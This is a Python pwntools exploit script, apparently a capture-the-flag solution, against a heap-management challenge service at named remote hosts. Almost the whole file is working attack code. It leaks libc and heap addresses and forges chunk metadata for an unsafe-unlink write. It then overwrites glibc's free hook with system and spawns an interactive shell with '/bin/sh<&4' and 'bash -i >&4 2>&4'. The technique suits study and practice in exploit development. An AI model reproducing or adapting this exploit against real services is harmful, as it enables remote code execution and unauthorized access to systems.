#!/usr/bin/python

from pwn import *

# Local

s = remote('plus.or.kr', 22222)

arena_offset = 0x3be7b8
system_offset = 0x46590
free_hook = 0x3c0a10


# Remote
'''
s = remote('chal.cykor.kr', 22222)

arena_offset = 0x3c4c58
system_offset = 0x44380
free_hook = 0x3c69a8
'''

jump_base = 0x27f4

hex2neg = lambda num: hex(jump_base - (0x100000000 - num))
padded_u64 = lambda s: u64(s + "\x00" * (8 - len(s)))

jumptable = [0xffffed3f, 0xfffff389, 0xfffff389, 0xfffff390, 0xfffff389, 
0xfffff390, 0xfffff389, 0xfffff389, 0xffffed63, 0xfffff389, 0xfffff389, 
0xfffff390, 0xfffff389, 0xfffff389, 0xfffff389, 0xfffff389, 0xffffee2c,
0xfffff390, 0xfffff389, 0xfffff389, 0xfffff389, 0xfffff389, 0xfffff390,
0xfffff389, 0xffffef9b, 0xfffff389, 0xfffff389, 0xfffff389, 0xfffff389,
0xfffff389, 0xfffff389, 0xfffff389, 0xfffff191, 0xfffff389, 0xfffff389,
0xfffff390, 0xfffff389, 0xfffff389, 0xfffff389, 0xfffff389, 0xfffff29a]

jumpadd_table = map(hex2neg,jumptable)

MAX_MANAGER = 9 #zero base index
manager_index = 5
jump_offset = 0 # equal or smaller than 0x28 (40)

# constant set
set20 = 0
read_routine = 1
malloc_routine = 2
realloc_routine = 3
write_routine = 4
free_routine = 5

def sendsinput(s,jumpoffset,SndString,manager_index):
  s.send(p32(jumpoffset) + SndString + p32(15) + p32(manager_index))

def setcheck(s,ind):
  sendsinput(s,set20,'AAAA',ind)

def read(s,ind,content):
  sendsinput(s,read_routine,'AAAA',ind)
  s.send(content)

def realloc(s,ind,newsize,target,content):
  sendsinput(s,realloc_routine,'AAAA',ind)
  s.send(p32(newsize) + p32(target))
  s.send(content)

def malloc(s,ind,size):
  sendsinput(s,malloc_routine,p32(size),ind)

def write(s,ind,target):
  sendsinput(s,write_routine,'AAAA',ind)
  s.send(p32(target))
  s.recvuntil('=> ')
  
  content = s.recv()
  log.info('buf content : ' + content.encode('hex'))

  return content

def free(s,ind,target):
  sendsinput(s,free_routine,'AAAA',ind)
  s.send(p32(target))

def main():
  cmd = '/bin/sh<&4'
  cmd += "\x00" * (0x80 - len(cmd))

  s.recvuntil('!\n')

  for i in range(4,9):
    setcheck(s, i)
    malloc(s, i, 0x80)
    read(s, i, chr(0x41 + i - 4) * 0x80)

  setcheck(s, 9)
  malloc(s, 9, 0x80)
  read(s, 9, cmd)

  free(s, 5, 5)
  setcheck(s, 5)

  free(s, 4, 4)
  setcheck(s, 4)

  libc_leak_str = write(s, 4, 4)[:-2]
  libc_leak_addr = padded_u64(libc_leak_str)
  setcheck(s, 4)

  free(s, 8, 8)
  setcheck(s, 8)

  heap_leak_str = write(s, 8, 8)[:-2]
  heap_leak_addr = padded_u64(heap_leak_str)
  setcheck(s, 8)

  libc_base = libc_leak_addr - arena_offset
  overwrite_ptr = heap_leak_addr - (0x30 * 4) + 0x20

  log.info("Leaked libc addr: %x" % libc_leak_addr)
  log.info("Leaked heap addr: %x" % heap_leak_addr)

  log.info("libc base: %x" % libc_base)
  log.info("overwrite ptr: %x" % overwrite_ptr)

  target_addr = libc_base + system_offset

  payload = p64(0x90)         # prev_size
  payload += p64(0x80 | 1)    # size
  payload += p64(overwrite_ptr - 0x18)  # fd
  payload += p64(overwrite_ptr - 0x10)  # bk
  payload += "A" * (0x80 - len(payload))  # buffer
  payload += p64(0x80)        # prev_size (chunk 2)
  payload += p64(0x90)        # size (chunk 2)
  payload += "B" * (0x100 - len(payload))

  # Chunk 6, 7, 8
  overwrite = ""
  overwrite += p64(0x31)
  overwrite += p64(0x0)
  overwrite += p64(0x100)
  overwrite += p64(libc_base + free_hook)
  overwrite += p64(0xf00000001)
  overwrite += p64(0x1)

  overwrite *= 3

  # Chunk 9
  overwrite += p64(0x31)
  overwrite += p64(0x0)
  overwrite += p64(0x100)
  overwrite += p64(heap_leak_addr + 0x90 * 5 + 0x10)
  overwrite += p64(0xf00000001)
  overwrite += p64(0x1)

  # Pad
  overwrite += "\x00" * (0x100 - len(overwrite))

  realloc(s, 6, 0x100, 6, payload)
  setcheck(s, 6)

  free(s, 5, 5)  # Now overwrite_ptr points overwrite_ptr - 0x18
  setcheck(s, 5)

  malloc(s, 5, 5)
  setcheck(s, 5)

  read(s, 6, overwrite) # Now overwrite_ptr points free_hook
  setcheck(s, 6)

  setcheck(s, 4)
  malloc(s, 4, 4)

  read(s, 6, p64(target_addr) + "\x00" * 0xf8) # overwrite free_hook by system
  setcheck(s, 6)

  free(s, 9, 9)
  setcheck(s, 9)

  s.sendline()
  s.sendline("bash -i >&4 2>&4")

  s.interactive()

  s.close()

if __name__ == '__main__':
  sys.exit(main())

